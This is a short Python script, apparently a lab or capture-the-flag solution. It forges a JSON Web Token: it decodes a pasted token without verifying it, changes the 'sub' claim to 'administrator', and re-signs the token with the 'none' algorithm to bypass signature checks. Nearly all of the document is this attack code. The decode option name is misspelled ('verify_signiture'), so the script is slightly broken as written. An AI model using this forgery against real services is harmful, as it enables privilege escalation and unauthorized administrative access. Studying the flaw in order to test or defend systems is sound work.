import jwt

# Paste your token here
token =""

# Decode the token without verifying 
decoded_token = jwt.decode(token, options={"verify_signiture": False})
print(f"Decoded Token: {decoded_token}\n")

# MOdify The Token (JWT manipulation)
decoded_token['sub'] = 'administrator'
print(f"MOdified Token: {decoded_token}\n")

# Generate a new token with the modified payload
# Re-encode the payload with None Algorithm

modified_token = jwt.encode(decoded_token, None, algorithm=None)
print(f"Modified token : {modified_token}\n")

